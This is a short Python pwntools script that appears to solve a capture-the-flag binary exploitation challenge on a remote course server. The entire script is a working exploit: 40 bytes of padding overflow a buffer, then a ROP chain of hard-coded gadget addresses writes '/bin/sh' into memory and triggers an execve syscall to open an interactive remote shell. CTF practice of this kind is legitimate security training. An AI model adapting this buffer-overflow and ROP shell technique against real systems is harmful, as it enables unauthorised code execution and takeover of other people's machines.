from pwn import *
pop_rdx = 0x4427e6
pop_rsi = 0x401577
pop_rdi = 0x401456
syscall = 0x4671b5
pop_rax_rdx_rbx = 0x478516
mov_drdi_rsi = 0x47a502
buf = 0x6c9a20
r = remote('csie.ctf.tw', 10130)
context.arch = "amd64"   
payload = 'a'*40
rop = flat([pop_rdi, buf, pop_rsi, "/bin/sh\x00", mov_drdi_rsi, pop_rsi, 0, pop_rax_rdx_rbx, 0x3b, 0, 0, syscall])
payload += rop
r.sendline(payload)
r.interactive()
